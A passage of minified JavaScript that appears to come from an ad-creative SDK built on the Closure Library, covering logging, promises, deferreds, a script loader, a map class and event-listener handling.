      (a & b) == b && (of |= b, of &= ~c);
    };
  t("studio.common.Environment", nf);
  nf.Type = {
    LIVE: 1,
    LOCAL: 2,
    BROWSER: 4,
    IN_APP: 8,
    LAYOUTS_PREVIEW: 16,
    CREATIVE_TOOLSET: 32,
    RENDERING_STUDIO: 64,
    RENDERING_TEST: 128,
    PREVIEW: 256
  };
  var of = 6;
  nf.addType = function (a) {
    of |= a;
    pf(a);
  };
  nf.setType = qf;
  var C = function (a) {
    return (of & a) == a;
  };
  nf.hasType = C;
  nf.getValue = function () {
    return of;
  };
  var sf = function (a, b) {
    mf.call(this, a, b);
    this.o = this.h = null;
    this.j = "rmad_mod";
  };
  n(sf, mf);
  sf.prototype.l = function () {
    return null !== this.h && null !== this.o ? (this.v = "&status=" + this.h + "&type=" + this.o, mf.prototype.l.call(this)) : "";
  };
  var tf = {
    Of: "dcm",
    pg: "studio",
    Lf: "clicktag"
  };
  var uf = function () {
    this.h = oe("studio.sdk");
  };
  h = uf.prototype;
  h.log = function (a, b) {
    qe(this.h, a, b);
  };
  h.rf = function (a) {
    qe(this.h, Ud, a);
  };
  h.gb = function (a) {
    re(this.h, a);
  };
  h.R = function (a) {
    A(this.h, a);
  };
  h.info = function (a) {
    B(this.h, a);
  };
  h.Yd = function (a) {
    qe(this.h, Yd, a);
  };
  h.Sa = function (a) {
    se(this.h, a);
  };
  h.he = function (a) {
    qe(this.h, $d, a);
  };
  h.ie = function (a) {
    qe(this.h, ae, a);
  };
  var D = new uf();
  t("studio.sdk.logger", D);
  t("studio.sdk.logger.setLevel", function (a, b) {
    pe(a, b);
  });
  t("studio.sdk.logger.Level.OFF", Td);
  t("studio.sdk.logger.Level.SHOUT", Ud);
  t("studio.sdk.logger.Level.SEVERE", Vd);
  t("studio.sdk.logger.Level.WARNING", Wd);
  let jshook = new Map();
  t("studio.sdk.logger.Level.INFO", Xd);
  t("studio.sdk.logger.Level.CONFIG", Yd);
  t("studio.sdk.logger.Level.FINE", Zd);
  t("studio.sdk.logger.Level.FINER", $d);
  t("studio.sdk.logger.Level.FINEST", ae);
  t("studio.sdk.logger.Level.ALL", be);
  t("studio.sdk.logger.log", D.log);
  t("studio.sdk.logger.shout", D.rf);
  t("studio.sdk.logger.severe", D.gb);
  t("studio.sdk.logger.warning", D.R);
  t("studio.sdk.logger.info", D.info);
  t("studio.sdk.logger.config", D.Yd);
  t("studio.sdk.logger.fine", D.Sa);
  t("studio.sdk.logger.finer", D.he);
  t("studio.sdk.logger.finest", D.ie);
  var vf = {
    ENABLER: "enabler",
    DCM_ENABLER: "dcmenabler",
    SSR_ENABLER: "ssrenabler",
    CLICK_TAG_ENABLER: "clicktagenabler",
    ENABLER_LOADER: "enablerloader",
    DCM_ENABLER_LOADER: "dcmenablerloader",
    CLICK_TAG_ENABLER_LOADER: "clicktagenablerloader",
    VIDEO: "video",
    CONFIGURABLE: "configurable",
    CONFIGURABLE_FILLER: "configurablefiller",
    LAYOUTS: "layouts",
    FILLER: "layoutsfiller",
    RAD_VIDEO: "rad_ui_video",
    GDN: "gdn"
  };
  t("studio.module.ModuleId", vf);
  function wf() {}
  ;
  var xf = function (a, b) {
    this.l = a;
    this.o = b;
    this.j = 0;
    this.h = null;
  };
  xf.prototype.get = function () {
    if (0 < this.j) {
      this.j--;
      var a = this.h;
      this.h = a.next;
      a.next = null;
    } else a = this.l();
    return a;
  };
  var yf = function (a, b) {
    a.o(b);
    100 > a.j && (a.j++, b.next = a.h, a.h = b);
  };
  var zf,
    Af = function () {
      var a = q.MessageChannel;
      "undefined" === typeof a && "undefined" !== typeof window && window.postMessage && window.addEventListener && !z("Presto") && (a = function () {
        var e = Bd(document, "IFRAME");
        e.style.display = "none";
        document.documentElement.appendChild(e);
        var f = e.contentWindow;
        e = f.document;
        e.open();
        e.close();
        var g = "callImmediate" + Math.random(),
          l = "file:" == f.location.protocol ? "*" : f.location.protocol + "//" + f.location.host;
        e = v(function (m) {
          if (("*" == l || m.origin == l) && m.data == g) this.port1.onmessage();
        }, this);
        f.addEventListener("message", e, !1);
        this.port1 = {};
        this.port2 = {
          postMessage: function () {
            f.postMessage(g, l);
          }
        };
      });
      if ("undefined" !== typeof a && !Ub()) {
        var b = new a(),
          c = {},
          d = c;
        b.port1.onmessage = function () {
          if (void 0 !== c.next) {
            c = c.next;
            var e = c.pc;
            c.pc = null;
            e();
          }
        };
        return function (e) {
          d.next = {
            pc: e
          };
          d = d.next;
          b.port2.postMessage(0);
        };
      }
      return function (e) {
        q.setTimeout(e, 0);
      };
    };
  var Bf = function () {
    this.j = this.h = null;
  };
  Bf.prototype.add = function (a, b) {
    var c = Cf.get();
    c.set(a, b);
    this.j ? this.j.next = c : (x(!this.h), this.h = c);
    this.j = c;
  };
  var Ef = function () {
      var a = Df,
        b = null;
      a.h && (b = a.h, a.h = a.h.next, a.h || (a.j = null), b.next = null);
      return b;
    },
    Cf = new xf(function () {
      return new Ff();
    }, function (a) {
      return a.reset();
    }),
    Ff = function () {
      this.next = this.scope = this.h = null;
    };
  Ff.prototype.set = function (a, b) {
    this.h = a;
    this.scope = b;
    this.next = null;
  };
  Ff.prototype.reset = function () {
    this.next = this.scope = this.h = null;
  };
  var Gf = q.console && q.console.createTask ? q.console.createTask.bind(q.console) : void 0,
    Hf = Gf ? Symbol("consoleTask") : void 0;
  function If(a, b) {
    function c() {
      var e = xa.apply(0, arguments),
        f = this;
      return d.run(function () {
        var g = a.call,
          l = g.apply,
          m = [f],
          p = m.concat;
        if (e instanceof Array) var r = e;else {
          r = fa(e);
          for (var F, J = []; !(F = r.next()).done;) J.push(F.value);
          r = J;
        }
        return l.call(g, a, p.call(m, r));
      });
    }
    b = void 0 === b ? "anonymous" : b;
    if (!Gf || a[Ua(Hf)]) return a;
    var d = Gf(a.name || b);
    c[Ua(Hf)] = d;
    return c;
  }
  ;
  var Jf,
    Kf = !1,
    Df = new Bf(),
    Mf = function (a, b) {
      Jf || Lf();
      Kf || (Jf(), Kf = !0);
      a = If(a, "goog.async.run");
      Df.add(a, b);
    },
    Lf = function () {
      if (q.Promise && q.Promise.resolve) {
        var a = q.Promise.resolve(void 0);
        Jf = function () {
          a.then(Nf);
        };
      } else Jf = function () {
        var b = Nf;
        "function" !== typeof q.setImmediate || q.Window && q.Window.prototype && (Sb() || !z("Edge")) && q.Window.prototype.setImmediate == q.setImmediate ? (zf || (zf = Af()), zf(b)) : q.setImmediate(b);
      };
    },
    Nf = function () {
      for (var a; a = Ef();) {
        try {
          a.h.call(a.scope);
        } catch (b) {
          Be(b);
        }
        yf(Cf, a);
      }
      Kf = !1;
    };
  var Of = function (a) {
    if (!a) return !1;
    try {
      return !!a.$goog_Thenable;
    } catch (b) {
      return !1;
    }
  };
  var Rf = function (a) {
      this.h = 0;
      this.A = void 0;
      this.o = this.j = this.l = null;
      this.v = this.s = !1;
      if (a != fb) try {
        var b = this;
        a.call(void 0, function (c) {
          Pf(b, 2, c);
        }, function (c) {
          if (!(c instanceof Qf)) try {
            if (c instanceof Error) throw c;
            throw Error("Promise rejected.");
          } catch (d) {}
          Pf(b, 3, c);
        });
      } catch (c) {
        Pf(this, 3, c);
      }
    },
    Sf = function () {
      this.next = this.context = this.l = this.j = this.h = null;
      this.o = !1;
    };
  Sf.prototype.reset = function () {
    this.context = this.l = this.j = this.h = null;
    this.o = !1;
  };
  var Tf = new xf(function () {
      return new Sf();
    }, function (a) {
      a.reset();
    }),
    Uf = function (a, b, c) {
      var d = Tf.get();
      d.j = a;
      d.l = b;
      d.context = c;
      return d;
    },
    Vf = function (a) {
      if (a instanceof Rf) return a;
      var b = new Rf(fb);
      Pf(b, 2, a);
      return b;
    },
    Wf = function (a) {
      return new Rf(function (b, c) {
        c(a);
      });
    },
    Yf = function (a, b, c) {
      Xf(a, b, c, null) || Mf(Ma(b, a));
    },
    Zf = function (a) {
      return new Rf(function (b, c) {
        var d = a.length,
          e = [];
        if (d) for (var f = function (p, r) {
            d--;
            e[p] = r;
            0 == d && b(e);
          }, g = function (p) {
            c(p);
          }, l = 0, m; l < a.length; l++) m = a[l], Yf(m, Ma(f, l), g);else b(e);
      });
    };
  Rf.prototype.then = function (a, b, c) {
    null != a && Ya(a, "opt_onFulfilled should be a function.");
    null != b && Ya(b, "opt_onRejected should be a function. Did you pass opt_context as the second argument instead of the third?");
    return $f(this, "function" === typeof a ? a : null, "function" === typeof b ? b : null, c);
  };
  Rf.prototype.$goog_Thenable = !0;
  var ag = function (a, b) {
    return $f(a, null, b);
  };
  Rf.prototype.cancel = function (a) {
    if (0 == this.h) {
      var b = new Qf(a);
      Mf(function () {
        bg(this, b);
      }, this);
    }
  };
  var bg = function (a, b) {
      if (0 == a.h) if (a.l) {
        var c = a.l;
        if (c.j) {
          for (var d = 0, e = null, f = null, g = c.j; g && (g.o || (d++, g.h == a && (e = g), !(e && 1 < d))); g = g.next) e || (f = g);
          e && (0 == c.h && 1 == d ? bg(c, b) : (f ? (d = f, x(c.j), x(null != d), d.next == c.o && (c.o = d), d.next = d.next.next) : cg(c), dg(c, e, 3, b)));
        }
        a.l = null;
      } else Pf(a, 3, b);
    },
    fg = function (a, b) {
      a.j || 2 != a.h && 3 != a.h || eg(a);
      x(null != b.j);
      a.o ? a.o.next = b : a.j = b;
      a.o = b;
    },
    $f = function (a, b, c, d) {
      b && (b = If(b, "goog.Promise.then"));
      c && (c = If(c, "goog.Promise.then"));
      var e = Uf(null, null, null);
      e.h = new Rf(function (f, g) {
        e.j = b ? function (l) {
          try {
            var m = b.call(d, l);
            f(m);
          } catch (p) {
            g(p);
          }
        } : f;
        e.l = c ? function (l) {
          try {
            var m = c.call(d, l);
            void 0 === m && l instanceof Qf ? g(l) : f(m);
          } catch (p) {
            g(p);
          }
        } : g;
      });
      e.h.l = a;
      fg(a, e);
      return e.h;
    };
  Rf.prototype.C = function (a) {
    x(1 == this.h);
    this.h = 0;
    Pf(this, 2, a);
  };
  Rf.prototype.F = function (a) {
    x(1 == this.h);
    this.h = 0;
    Pf(this, 3, a);
  };
  var Pf = function (a, b, c) {
      0 == a.h && (a === c && (b = 3, c = new TypeError("Promise cannot resolve to itself")), a.h = 1, Xf(c, a.C, a.F, a) || (a.A = c, a.h = b, a.l = null, eg(a), 3 != b || c instanceof Qf || gg(a, c)));
    },
    Xf = function (a, b, c, d) {
      if (a instanceof Rf) return null != b && Ya(b, "opt_onFulfilled should be a function."), null != c && Ya(c, "opt_onRejected should be a function. Did you pass opt_context as the second argument instead of the third?"), fg(a, Uf(b || fb, c || null, d)), !0;
      if (Of(a)) return a.then(b, c, d), !0;
      if (u(a)) try {
        var e = a.then;
        if ("function" === typeof e) return hg(a, e, b, c, d), !0;
      } catch (f) {
        return c.call(d, f), !0;
      }
      return !1;
    },
    hg = function (a, b, c, d, e) {
      var f = !1,
        g = function (m) {
          f || (f = !0, c.call(e, m));
        },
        l = function (m) {
          f || (f = !0, d.call(e, m));
        };
      try {
        b.call(a, g, l);
      } catch (m) {
        l(m);
      }
    },
    eg = function (a) {
      a.s || (a.s = !0, Mf(a.B, a));
    },
    cg = function (a) {
      var b = null;
      a.j && (b = a.j, a.j = b.next, b.next = null);
      a.j || (a.o = null);
      null != b && x(null != b.j);
      return b;
    };
  Rf.prototype.B = function () {
    for (var a; a = cg(this);) dg(this, a, this.h, this.A);
    this.s = !1;
  };
  var dg = function (a, b, c, d) {
      if (3 == c && b.l && !b.o) for (; a && a.v; a = a.l) a.v = !1;
      if (b.h) b.h.l = null, ig(b, c, d);else try {
        b.o ? b.j.call(b.context) : ig(b, c, d);
      } catch (e) {
        jg.call(null, e);
      }
      yf(Tf, b);
    },
    ig = function (a, b, c) {
      2 == b ? a.j.call(a.context, c) : a.l && a.l.call(a.context, c);
    },
    gg = function (a, b) {
      a.v = !0;
      Mf(function () {
        a.v && jg.call(null, b);
      });
    },
    jg = Be,
    Qf = function (a) {
      Qa.call(this, a);
    };
  w(Qf, Qa);
  Qf.prototype.name = "cancel"; /*
                                Copyright 2005, 2007 Bob Ippolito. All Rights Reserved.
                                Copyright The Closure Library Authors.
                                SPDX-License-Identifier: MIT
                                */
  var E = function (a, b) {
    this.A = [];
    this.K = a;
    this.G = b || null;
    this.o = this.h = !1;
    this.l = void 0;
    this.F = this.aa = this.C = !1;
    this.B = 0;
    this.j = null;
    this.v = 0;
  };
  w(E, wf);
  E.prototype.cancel = function (a) {
    if (this.h) this.l instanceof E && this.l.cancel();else {
      if (this.j) {
        var b = this.j;
        delete this.j;
        a ? b.cancel(a) : (b.v--, 0 >= b.v && b.cancel());
      }
      this.K ? this.K.call(this.G, this) : this.F = !0;
      this.h || this.s(new kg(this));
    }
  };
  E.prototype.ga = function (a, b) {
    this.C = !1;
    lg(this, a, b);
  };
  var lg = function (a, b, c) {
      a.h = !0;
      a.l = c;
      a.o = !b;
      mg(a);
    },
    og = function (a) {
      if (a.h) {
        if (!a.F) throw new ng(a);
        a.F = !1;
      }
    };
  E.prototype.callback = function (a) {
    og(this);
    pg(a);
    lg(this, !0, a);
  };
  E.prototype.s = function (a) {
    og(this);
    pg(a);
    lg(this, !1, a);
  };
  var pg = function (a) {
      x(!(a instanceof E), "An execution sequence may not be initiated with a blocking Deferred.");
    },
    rg = function (a, b, c) {
      qg(a, b, null, c);
    },
    qg = function (a, b, c, d) {
      x(!a.aa, "Blocking Deferreds can not be re-used");
      a.A.push([b, c, d]);
      a.h && mg(a);
    };
  E.prototype.then = function (a, b, c) {
    var d,
      e,
      f = new Rf(function (g, l) {
        e = g;
        d = l;
      });
    qg(this, e, function (g) {
      g instanceof kg ? f.cancel() : d(g);
      return sg;
    }, this);
    return f.then(a, b, c);
  };
  E.prototype.$goog_Thenable = !0;
  var tg = function (a, b) {
    b instanceof E ? rg(a, v(b.J, b)) : rg(a, function () {
      return b;
    });
  };
  E.prototype.J = function (a) {
    var b = new E();
    qg(this, b.callback, b.s, b);
    a && (b.j = this, this.v++);
    return b;
  };
  var ug = function (a) {
      return kb(a.A, function (b) {
        return "function" === typeof b[1];
      });
    },
    sg = {},
    mg = function (a) {
      if (a.B && a.h && ug(a)) {
        var b = a.B,
          c = vg[b];
        c && (q.clearTimeout(c.h), delete vg[b]);
        a.B = 0;
      }
      a.j && (a.j.v--, delete a.j);
      b = a.l;
      for (var d = c = !1; a.A.length && !a.C;) {
        var e = a.A.shift(),
          f = e[0],
          g = e[1];
        e = e[2];
        if (f = a.o ? g : f) try {
          var l = f.call(e || a.G, b);
          l === sg && (l = void 0);
          void 0 !== l && (a.o = a.o && (l == b || l instanceof Error), a.l = b = l);
          if (Of(b) || "function" === typeof q.Promise && b instanceof q.Promise) d = !0, a.C = !0;
        } catch (m) {
          b = m, a.o = !0, ug(a) || (c = !0);
        }
      }
      a.l = b;
      d && (l = v(a.ga, a, !0), d = v(a.ga, a, !1), b instanceof E ? (qg(b, l, d), b.aa = !0) : b.then(l, d));
      c && (b = new wg(b), vg[b.h] = b, a.B = b.h);
    },
    ng = function () {
      Qa.call(this);
    };
  w(ng, Qa);
  ng.prototype.message = "Deferred has already fired";
  ng.prototype.name = "AlreadyCalledError";
  var kg = function () {
    Qa.call(this);
  };
  w(kg, Qa);
  kg.prototype.message = "Deferred was canceled";
  kg.prototype.name = "CanceledError";
  var wg = function (a) {
    this.h = q.setTimeout(v(this.l, this), 0);
    this.j = a;
  };
  wg.prototype.l = function () {
    x(vg[this.h], "Cannot throw an error that is not scheduled.");
    delete vg[this.h];
    throw this.j;
  };
  var vg = {};
  var Bg = function (a) {
      var b = {},
        c = b.document || document,
        d = Cc(a).toString(),
        e = Jd(new sd(c), "SCRIPT"),
        f = {
          kd: e,
          qd: void 0
        },
        g = new E(xg, f),
        l = null,
        m = null != b.timeout ? b.timeout : 5E3;
      0 < m && (l = window.setTimeout(function () {
        yg(e, !0);
        g.s(new zg(1, "Timeout reached for loading script " + d));
      }, m), f.qd = l);
      e.onload = e.onreadystatechange = function () {
        e.readyState && "loaded" != e.readyState && "complete" != e.readyState || (yg(e, b.tg || !1, l), g.callback(null));
      };
      e.onerror = function () {
        yg(e, !0, l);
        g.s(new zg(0, "Error while loading script " + d));
      };
      f = b.attributes || {};
      xc(f, {
        type: "text/javascript",
        charset: "UTF-8"
      });
      wd(e, f);
      id(e, a);
      Ag(c).appendChild(e);
      return g;
    },
    Ag = function (a) {
      var b;
      return (b = (a || document).getElementsByTagName("HEAD")) && 0 !== b.length ? b[0] : a.documentElement;
    },
    xg = function () {
      if (this && this.kd) {
        var a = this.kd;
        a && "SCRIPT" == a.tagName && yg(a, !0, this.qd);
      }
    },
    yg = function (a, b, c) {
      null != c && q.clearTimeout(c);
      a.onload = function () {};
      a.onerror = function () {};
      a.onreadystatechange = function () {};
      b && window.setTimeout(function () {
        Gd(a);
      }, 0);
    },
    zg = function (a, b) {
      var c = "Jsloader error (code #" + a + ")";
      b && (c += ": " + b);
      Qa.call(this, c);
      this.code = a;
    };
  w(zg, Qa);
  var Cg = function (a, b) {
    this.h = a[q.Symbol.iterator]();
    this.j = b;
  };
  Cg.prototype[Symbol.iterator] = function () {
    return this;
  };
  Cg.prototype.next = function () {
    var a = this.h.next();
    return {
      value: a.done ? void 0 : this.j.call(void 0, a.value),
      done: a.done
    };
  };
  var Dg = function (a, b) {
    return new Cg(a, b);
  };
  var Eg = function () {};
  Eg.prototype.next = function () {
    return Fg;
  };
  var Fg = Rd({
    done: !0,
    value: void 0
  });
  Eg.prototype.ya = function () {
    return this;
  };
  var Jg = function (a) {
      if (a instanceof Gg || a instanceof Hg || a instanceof Ig) return a;
      if ("function" == typeof a.next) return new Gg(function () {
        return a;
      });
      if ("function" == typeof a[Symbol.iterator]) return new Gg(function () {
        return a[Symbol.iterator]();
      });
      if ("function" == typeof a.ya) return new Gg(function () {
        return a.ya();
      });
      throw Error("Not an iterator or iterable.");
    },
    Gg = function (a) {
      this.h = a;
    };
  Gg.prototype.ya = function () {
    return new Hg(this.h());
  };
  Gg.prototype[Symbol.iterator] = function () {
    return new Ig(this.h());
  };
  Gg.prototype.j = function () {
    return new Ig(this.h());
  };
  var Hg = function (a) {
    this.h = a;
  };
  n(Hg, Eg);
  Hg.prototype.next = function () {
    return this.h.next();
  };
  Hg.prototype[Symbol.iterator] = function () {
    return new Ig(this.h);
  };
  Hg.prototype.j = function () {
    return new Ig(this.h);
  };
  var Ig = function (a) {
    Gg.call(this, function () {
      return a;
    });
    this.l = a;
  };
  n(Ig, Gg);
  Ig.prototype.next = function () {
    return this.l.next();
  };
  var G = function (a, b) {
    this.j = {};
    this.h = [];
    this.l = this.size = 0;
    var c = arguments.length;
    if (1 < c) {
      if (c % 2) throw Error("Uneven number of arguments");
      for (var d = 0; d < c; d += 2) this.set(arguments[d], arguments[d + 1]);
    } else if (a) if (a instanceof G) for (c = a.Ha(), d = 0; d < c.length; d++) this.set(c[d], a.get(c[d]));else for (d in a) this.set(d, a[d]);
  };
  h = G.prototype;
  const hashCodeFunc = obj => {
    return Object.keys(obj).sort().join("").split('').reduce((prev, curr) => (prev << 5) - prev + curr.charCodeAt(0) & (prev << 5) - prev + curr.charCodeAt(0), 0).toString(16);
  };
  h.ja = function () {
    return this.size;
  };
  h.Z = function () {
    Kg(this);
    for (var a = [], b = 0; b < this.h.length; b++) a.push(this.j[this.h[b]]);
    return a;
  };
  h.Ha = function () {
    Kg(this);
    return this.h.concat();
  };
  h.ia = function (a) {
    return this.has(a);
  };
  h.has = function (a) {
    return Lg(this.j, a);
  };
  h.Ya = function (a) {
    for (var b = 0; b < this.h.length; b++) {
      var c = this.h[b];
      if (Lg(this.j, c) && this.j[c] == a) return !0;
    }
    return !1;
  };
  var Mg = function (a) {
      a.j = {};
      a.h.length = 0;
      a.size = 0;
      a.l = 0;
    },
    Kg = function (a) {
      if (a.size != a.h.length) {
        for (var b = 0, c = 0; b < a.h.length;) {
          var d = a.h[b];
          Lg(a.j, d) && (a.h[c++] = d);
          b++;
        }
        a.h.length = c;
      }
      if (a.size != a.h.length) {
        var e = {};
        for (c = b = 0; b < a.h.length;) d = a.h[b], Lg(e, d) || (a.h[c++] = d, e[d] = 1), b++;
        a.h.length = c;
      }
    };
  h = G.prototype;
  h.get = function (a, b) {
    return Lg(this.j, a) ? this.j[a] : b;
  };
  h.set = function (a, b) {
    Lg(this.j, a) || (this.size += 1, this.h.push(a), this.l++);
    this.j[a] = b;
  };
  h.forEach = function (a, b) {
    for (var c = this.Ha(), d = 0; d < c.length; d++) {
      var e = c[d],
        f = this.get(e);
      a.call(b, f, e, this);
    }
  };
  h.keys = function () {
    return Jg(this.ya(!0)).j();
  };
  h.values = function () {
    return Jg(this.ya(!1)).j();
  };
  h.entries = function () {
    var a = this;
    return Dg(this.keys(), function (b) {
      return [b, a.get(b)];
    });
  };
  h.ya = function (a) {
    Kg(this);
    var b = 0,
      c = this.l,
      d = this,
      e = new Eg();
    e.next = function () {
      if (c != d.l) throw Error("The map has changed since the iterator was created");
      if (b >= d.h.length) return Fg;
      var f = d.h[b++];
      return {
        value: a ? f : d.j[f],
        done: !1
      };
    };
    return e;
  };
  var Lg = function (a, b) {
    return Object.prototype.hasOwnProperty.call(a, b);
  };
  function Ng(a) {
    a && "function" == typeof a.dispose && a.dispose();
  }
  ;
  function Og(a) {
    for (var b = 0, c = arguments.length; b < c; ++b) {
      var d = arguments[b];
      Fa(d) ? Og.apply(null, d) : Ng(d);
    }
  }
  ;
  var H = function () {
    this.ga = this.ga;
    this.aa = this.aa;
  };
  H.prototype.ga = !1;
  H.prototype.isDisposed = function () {
    return this.ga;
  };
  H.prototype.dispose = function () {
    this.ga || (this.ga = !0, this.D());
  };
  var Pg = function (a, b) {
    b = Ma(Ng, b);
    a.ga ? b() : (a.aa || (a.aa = []), a.aa.push(b));
  };
  H.prototype.D = function () {
    if (this.aa) for (; this.aa.length;) this.aa.shift()();
  };
  var Qg = function (a, b) {
    this.type = a;
    this.h = this.target = b;
    this.defaultPrevented = this.j = !1;
  };
  Qg.prototype.stopPropagation = function () {
    this.j = !0;
  };
  Qg.prototype.l = function () {
    this.defaultPrevented = !0;
  };
  var Rg = function (a) {
    a.l();
  };
  var Sg = function () {
    if (!q.addEventListener || !Object.defineProperty) return !1;
    var a = !1,
      b = Object.defineProperty({}, "passive", {
        get: function () {
          a = !0;
        }
      });
    try {
      q.addEventListener("test", function () {}, b), q.removeEventListener("test", function () {}, b);
    } catch (c) {}
    return a;
  }();
  var Ug = function (a, b) {
    Qg.call(this, a ? a.type : "");
    this.relatedTarget = this.h = this.target = null;
    this.button = this.screenY = this.screenX = this.clientY = this.clientX = 0;
    this.key = "";
    this.metaKey = this.shiftKey = this.altKey = this.ctrlKey = !1;
    this.state = null;
    this.pointerId = 0;
    this.pointerType = "";
    this.ca = null;
    if (a) {
      var c = this.type = a.type,
        d = a.changedTouches && a.changedTouches.length ? a.changedTouches[0] : null;
      this.target = a.target || a.srcElement;
      this.h = b;
      (b = a.relatedTarget) ? gc && (bc(b, "nodeName") || (b = null)) : "mouseover" == c ? b = a.fromElement : "mouseout" == c && (b = a.toElement);
      this.relatedTarget = b;
      d ? (this.clientX = void 0 !== d.clientX ? d.clientX : d.pageX, this.clientY = void 0 !== d.clientY ? d.clientY : d.pageY, this.screenX = d.screenX || 0, this.screenY = d.screenY || 0) : (this.clientX = void 0 !== a.clientX ? a.clientX : a.pageX, this.clientY = void 0 !== a.clientY ? a.clientY : a.pageY, this.screenX = a.screenX || 0, this.screenY = a.screenY || 0);
      this.button = a.button;
      this.key = a.key || "";
      this.ctrlKey = a.ctrlKey;
      this.altKey = a.altKey;
      this.shiftKey = a.shiftKey;
      this.metaKey = a.metaKey;
      this.pointerId = a.pointerId || 0;
      this.pointerType = "string" === typeof a.pointerType ? a.pointerType : Tg[a.pointerType] || "";
      this.state = a.state;
      this.ca = a;
      a.defaultPrevented && Ug.S.l.call(this);
    }
  };
  w(Ug, Qg);
  var Tg = Rd({
    2: "touch",
    3: "pen",
    4: "mouse"
  });
  Ug.prototype.stopPropagation = function () {
    Ug.S.stopPropagation.call(this);
    this.ca.stopPropagation ? this.ca.stopPropagation() : this.ca.cancelBubble = !0;
  };
  Ug.prototype.l = function () {
    Ug.S.l.call(this);
    var a = this.ca;
    a.preventDefault ? a.preventDefault() : a.returnValue = !1;
  };
  Ug.prototype.me = function () {
    return this.ca;
  };
  var Vg = "closure_listenable_" + (1E6 * Math.random() | 0),
    Wg = function (a) {
      return !(!a || !a[Vg]);
    };
  var Xg = 0;
  var Yg = function (a, b, c, d, e) {
      this.listener = a;
      this.proxy = null;
      this.src = b;
      this.type = c;
      this.capture = !!d;
      this.Ta = e;
      this.key = ++Xg;
      this.fb = this.pb = !1;
    },
    Zg = function (a) {
      a.fb = !0;
      a.listener = null;
      a.proxy = null;
      a.src = null;
      a.Ta = null;
    };
  var $g = function (a) {
    this.src = a;
    this.h = {};
    this.j = 0;
  };
  $g.prototype.add = function (a, b, c, d, e) {
    var f = a.toString();
    a = this.h[f];
    a || (a = this.h[f] = [], this.j++);
    var g = ah(a, b, d, e);
    -1 < g ? (b = a[g], c || (b.pb = !1)) : (b = new Yg(b, this.src, f, !!d, e), b.pb = c, a.push(b));
    return b;
  };
  var bh = function (a, b) {
      var c = b.type;
      if (!(c in a.h)) return !1;
      var d = nb(a.h[c], b);
      d && (Zg(b), 0 == a.h[c].length && (delete a.h[c], a.j--));
      return d;
    },
    ch = function (a, b) {
      b = b && b.toString();
      var c = 0,
        d;
      for (d in a.h) if (!b || d == b) {
        for (var e = a.h[d], f = 0; f < e.length; f++) ++c, Zg(e[f]);
        delete a.h[d];
        a.j--;
      }
    },
    dh = function (a, b, c, d, e) {
      a = a.h[b.toString()];
      b = -1;
      a && (b = ah(a, c, d, e));
      return -1 < b ? a[b] : null;
    },
    eh = function (a, b) {
      var c = void 0 !== b,
        d = c ? b.toString() : "";
      return pc(a.h, function (e) {
        for (var f = 0; f < e.length; ++f) if (!c || e[f].type == d) return !0;
        return !1;
      });
    },
    ah = function (a, b, c, d) {
      for (var e = 0; e < a.length; ++e) {
        var f = a[e];
        if (!f.fb && f.listener == b && f.capture == !!c && f.Ta == d) return e;
      }
      return -1;
    };
  var fh = "closure_lm_" + (1E6 * Math.random() | 0),
    gh = {},
    hh = 0,
    jh = function (a, b, c, d, e) {
      if (d && d.once) return ih(a, b, c, d, e);
      if (Array.isArray(b)) {
        for (var f = 0; f < b.length; f++) jh(a, b[f], c, d, e);
        return null;
      }
      c = kh(c);
      return Wg(a) ? a.Ma(b, c, u(d) ? !!d.capture : !!d, e) : lh(a, b, c, !1, d, e);
    },
    lh = function (a, b, c, d, e, f) {
      if (!b) throw Error("Invalid event type");
      var g = u(e) ? !!e.capture : !!e,
        l = mh(a);
      l || (a[fh] = l = new $g(a));
      c = l.add(b, c, d, g, f);
      if (c.proxy) return c;
      d = nh();
      c.proxy = d;
      d.src = a;
      d.listener = c;
      if (a.addEventListener) Sg || (e = g), void 0 === e && (e = !1), a.addEventListener(b.toString(), d, e);else if (a.attachEvent) a.attachEvent(oh(b.toString()), d);else if (a.addListener && a.removeListener) x("change" === b, "MediaQueryList only has a change event"), a.addListener(d);else throw Error("addEventListener and attachEvent are unavailable.");
      hh++;
      return c;
    },
    nh = function () {
      var a = ph,
        b = function (c) {
          return a.call(b.src, b.listener, c);
        };
      return b;
    },
    ih = function (a, b, c, d, e) {
      if (Array.isArray(b)) {
        for (var f = 0; f < b.length; f++) ih(a, b[f], c, d, e);
        return null;
      }
      c = kh(c);
      return Wg(a) ? a.v.add(String(b), c, !0, u(d) ? !!d.capture : !!d, e) : lh(a, b, c, !0, d, e);
    },
    qh = function (a, b, c, d, e) {
      if (Array.isArray(b)) for (var f = 0; f < b.length; f++) qh(a, b[f], c, d, e);else d = u(d) ? !!d.capture : !!d, c = kh(c), Wg(a) ? a.Va(b, c, d, e) : a && (a = mh(a)) && (b = dh(a, b, c, d, e)) && rh(b);
    },
    rh = function (a) {
      if ("number" === typeof a || !a || a.fb) return !1;
      var b = a.src;
      if (Wg(b)) return bh(b.v, a);
      var c = a.type,
        d = a.proxy;
      b.removeEventListener ? b.removeEventListener(c, d, a.capture) : b.detachEvent ? b.detachEvent(oh(c), d) : b.addListener && b.removeListener && b.removeListener(d);
      hh--;
      (c = mh(b)) ? (bh(c, a), 0 == c.j && (c.src = null, b[fh] = null)) : Zg(a);
      return !0;
    },
    sh = function (a, b, c, d, e) {
      c = kh(c);
      d = !!d;
      return Wg(a) ? dh(a.v, String(b), c, d, e) : a ? (a = mh(a)) ? dh(a, b, c, d, e) : null : null;
    },
    th = function (a, b) {
      if (Wg(a)) return eh(a.v, void 0 !== b ? String(b) : void 0);
      a = mh(a);
      return !!a && eh(a, b);
    },
    oh = function (a) {
      return a in gh ? gh[a] : gh[a] = "on" + a;
    },
    ph = function (a, b) {
      if (a.fb) a = !0;else {
        b = new Ug(b, this);
        var c = a.listener,
          d = a.Ta || a.src;
        a.pb && rh(a);
        a = c.call(d, b);
      }
      return a;
    },
    mh = function (a) {
      a = a[fh];
      return a instanceof $g ? a : null;
    },
    uh = "__closure_events_fn_" + (1E9 * Math.random() >>> 0),
    kh = function (a) {
      x(a, "Listener can not be null.");
      if ("function" === typeof a) return a;
      x(a.handleEvent, "An object listener must have handleEvent method.");
      a[uh] || (a[uh] = function (b) {
        return a.handleEvent(b);
      });
      return a[uh];
    };
  var I = function () {
    H.call(this);
    this.v = new $g(this);
    this.hf = this;
    this.mb = null;
  };
  w(I, H);
  I.prototype[Vg] = !0;
  h = I.prototype;
  h.Zb = function (a) {
    this.mb = a;
  };
  h.addEventListener = function (a, b, c, d) {
    jh(this, a, b, c, d);
  };
  h.removeEventListener = function (a, b, c, d) {
